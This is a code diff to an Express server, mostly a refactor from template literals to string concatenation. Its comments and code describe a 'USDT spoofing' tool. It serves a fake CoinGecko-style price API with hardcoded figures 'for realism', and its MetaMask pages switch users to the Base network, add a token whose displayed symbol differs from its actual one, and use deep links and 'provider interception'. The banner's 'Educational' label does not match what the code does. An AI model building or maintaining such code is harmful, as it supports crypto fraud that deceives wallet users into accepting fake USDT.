@@ -48,7 +48,7 @@ app.use((req, res, next) => {
   const start = Date.now();
   res.on('finish', () => {
     const duration = Date.now() - start;
-    console.log(`${req.method} ${req.originalUrl} ${res.statusCode} ${duration}ms`);
+    console.log(req.method + " " + req.originalUrl + " " + res.statusCode + " " + duration + "ms");
   });
   next();
 });
@@ -82,7 +82,7 @@ app.get('/api/token-info', (req, res) => {
 app.get('/api/generate-qr', async (req, res) => {
   try {
     // Get URL from query or generate default
-    const url = req.query.url || `${req.protocol}://${req.get('host')}/mobile/add-token`;
+    const url = req.query.url || (req.protocol + "://" + req.get('host') + "/mobile/add-token");
     const qrCodeDataURL = await qrcode.toDataURL(url, {
       errorCorrectionLevel: 'H', // High error correction for better scanning
       margin: 2,
@@ -201,24 +201,24 @@ app.get('/api/v3/simple/price', (req, res) => {
       if (req.query.include_market_cap === 'true') {
         // Market cap varies by currency - for USD it's around 83 billion
         if (currency === 'usd') {
-          priceData[`${currency}_market_cap`] = 83500000000;
+          priceData[currency + "_market_cap"] = 83500000000;
         } else {
           // Approximate conversion for other currencies
-          priceData[`${currency}_market_cap`] = 83500000000;
+          priceData[currency + "_market_cap"] = 83500000000;
         }
       }
       
       if (req.query.include_24hr_vol === 'true') {
         if (currency === 'usd') {
-          priceData[`${currency}_24h_vol`] = 45750000000;
+          priceData[currency + "_24h_vol"] = 45750000000;
         } else {
-          priceData[`${currency}_24h_vol`] = 45750000000;
+          priceData[currency + "_24h_vol"] = 45750000000;
         }
       }
       
       if (req.query.include_24hr_change === 'true') {
         // Slight variation for realism
-        priceData[`${currency}_24h_change`] = 0.02;
+        priceData[currency + "_24h_change"] = 0.02;
       }
     });
     
@@ -459,6 +459,9 @@ app.get('/api/asset_platforms', (req, res) => {
 
 // Mobile-optimized token addition page with USDT spoofing
 app.get('/mobile/add-token', (req, res) => {
+  const host = req.get('host');
+  const protocol = req.protocol;
+  
   const html = `
 <!DOCTYPE html>
 <html lang="en">
@@ -746,7 +749,7 @@ app.get('/mobile/add-token', (req, res) => {
       
       // Fetch QR code on page load
       try {
-        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect');
+        const res = await fetch('/api/generate-qr?url=https://metamask.app.link/dapp/${host}/metamask-redirect');
         const data = await res.json();
         qrImage.src = data.qrCodeDataURL;
       } catch (err) {
@@ -778,14 +781,14 @@ app.get('/mobile/add-token', (req, res) => {
       
       // Helper function to safely call MetaMask
       async function safeMetaMaskCall(method, params) {
-        console.log(`Calling MetaMask: ${method}`);
+        console.log("Calling MetaMask: " + method);
         try {
           return await window.ethereum.request({
             method: method,
             params: params || []
           });
         } catch (error) {
-          console.error(`MetaMask Error (${method}):`, error);
+          console.error("MetaMask Error (" + method + "):", error);
           return { error };
         }
       }
@@ -802,7 +805,7 @@ app.get('/mobile/add-token', (req, res) => {
             // Check and switch to Base network first
             loadingText.textContent = "Checking network...";
             const chainId = await safeMetaMaskCall('eth_chainId');
-            console.log(`Current chain ID: ${chainId}, Target: ${TOKEN_CONFIG.networkId}`);
+            console.log("Current chain ID: " + chainId + ", Target: ${TOKEN_CONFIG.networkId}");
             
             if (chainId !== '${TOKEN_CONFIG.networkId}') {
               loadingText.textContent = "Switching to Base network...";
@@ -841,7 +844,7 @@ app.get('/mobile/add-token', (req, res) => {
                       // User rejected
                       throw new Error("User rejected network addition");
                     } else {
-                      console.log(`Error adding network: ${addResult.error.message}`);
+                      console.log("Error adding network: " + addResult.error.message);
                     }
                   }
                 } else if (switchResult.error.message && 
@@ -852,7 +855,7 @@ app.get('/mobile/add-token', (req, res) => {
                   // User rejected
                   throw new Error("User rejected network switch");
                 } else {
-                  console.log(`Network switch error: ${switchResult.error.message}`);
+                  console.log("Network switch error: " + switchResult.error.message);
                 }
               }
             } else {
@@ -881,11 +884,11 @@ app.get('/mobile/add-token', (req, res) => {
                 // User rejected
                 console.log("User rejected token addition");
               } else {
-                throw new Error(`Token addition error: ${result.error.message}`);
+                throw new Error("Token addition error: " + result.error.message);
               }
             } else if (result === true) {
               // Success! Redirect to success page
-              window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+              window.location.href = '${protocol}://${host}/mobile/success';
             } else {
               // Something unexpected happened
               console.log("Unexpected result:", result);
@@ -895,7 +898,7 @@ app.get('/mobile/add-token', (req, res) => {
             }
           } else {
             // No MetaMask in browser - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
+            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
             
             // Hide loading after a brief delay
             setTimeout(() => {
@@ -945,11 +948,11 @@ app.get('/mobile/add-token', (req, res) => {
               if (result.error.code === 4001) {
                 console.log("User rejected alternative token addition");
               } else {
-                throw new Error(`Alternative method error: ${result.error.message}`);
+                throw new Error("Alternative method error: " + result.error.message);
               }
             } else if (result === true) {
               // Success! Redirect to success page
-              window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+              window.location.href = '${protocol}://${host}/mobile/success';
             } else {
               // Something unexpected happened
               console.log("Unexpected result:", result);
@@ -958,7 +961,7 @@ app.get('/mobile/add-token', (req, res) => {
             }
           } else {
             // No MetaMask - try deep linking
-            window.location.href = 'https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect';
+            window.location.href = 'https://metamask.app.link/dapp/${host}/metamask-redirect';
             
             // Hide loading after a brief delay
             setTimeout(() => {
@@ -1109,12 +1112,15 @@ app.get('/mobile/success', (req, res) => {
 // Direct MetaMask deep link endpoint
 app.get('/api/add-token-mobile', (req, res) => {
   // Generate a WalletConnect-compatible deep link for MetaMask mobile
-  const deepLink = `https://metamask.app.link/dapp/${req.headers.host}/metamask-redirect`;
+  const deepLink = "https://metamask.app.link/dapp/" + req.headers.host + "/metamask-redirect";
   res.redirect(deepLink);
 });
 
 // MetaMask redirect handler with provider interception
 app.get('/metamask-redirect', (req, res) => {
+  const host = req.get('host');
+  const protocol = req.protocol;
+  
   const html = `
 <!DOCTYPE html>
 <html lang="en">
@@ -1233,14 +1239,14 @@ app.get('/metamask-redirect', (req, res) => {
     
     // Helper function to safely call MetaMask
     async function safeMetaMaskCall(method, params) {
-      console.log(`Calling MetaMask: ${method}`);
+      console.log("Calling MetaMask: " + method);
       try {
         return await window.ethereum.request({
           method: method,
           params: params || []
         });
       } catch (error) {
-        console.error(`MetaMask Error (${method}):`, error);
+        console.error("MetaMask Error (" + method + "):", error);
         return { error };
       }
     }
@@ -1334,7 +1340,7 @@ app.get('/metamask-redirect', (req, res) => {
             }
           } else if (tokenResult === true) {
             // Success - redirect to success page
-            window.location.href = '${req.protocol}://${req.get('host')}/mobile/success';
+            window.location.href = '${protocol}://${host}/mobile/success';
           } else {
             document.getElementById('error-message').style.display = 'block';
             document.getElementById('error-message').textContent = 'Unexpected result from MetaMask';
@@ -1358,7 +1364,7 @@ app.get('/metamask-redirect', (req, res) => {
       // CRITICAL FIX: Set a forced timeout to ensure UI never gets stuck
       forceHideTimeout = setTimeout(() => {
         console.log("Forced timeout - redirecting to fallback");
-        window.location.href = '${req.protocol}://${req.get('host')}/mobile/add-token?error=timeout';
+        window.location.href = '${protocol}://${host}/mobile/add-token?error=timeout';
       }, 15000); // 15 seconds timeout
       
       console.log("Waiting 1 second before adding token...");
@@ -1439,14 +1445,14 @@ function formatTokenAmount(amount, decimals = TOKEN_CONFIG.decimals) {
 
 // Start the server
 server.listen(port, () => {
-  console.log(`======================================`);
-  console.log(`Educational Token Display Server`);
-  console.log(`======================================`);
-  console.log(`Server running on port: ${port}`);
-  console.log(`Token Display: ${TOKEN_CONFIG.actualSymbol} → ${TOKEN_CONFIG.displaySymbol}`);
-  console.log(`Network: ${TOKEN_CONFIG.networkName} (${TOKEN_CONFIG.networkId})`);
-  console.log(`Contract: ${TOKEN_CONFIG.address}`);
-  console.log(`Decimals: ${TOKEN_CONFIG.decimals}`);
-  console.log(`API Health Check: http://localhost:${port}/api/token-info`);
-  console.log(`======================================`);
+  console.log("======================================");
+  console.log("Educational Token Display Server");
+  console.log("======================================");
+  console.log("Server running on port: " + port);
+  console.log("Token Display: " + TOKEN_CONFIG.actualSymbol + " → " + TOKEN_CONFIG.displaySymbol);
+  console.log("Network: " + TOKEN_CONFIG.networkName + " (" + TOKEN_CONFIG.networkId + ")");
+  console.log("Contract: " + TOKEN_CONFIG.address);
+  console.log("Decimals: " + TOKEN_CONFIG.decimals);
+  console.log("API Health Check: http://localhost:" + port + "/api/token-info");
+  console.log("======================================");
 });
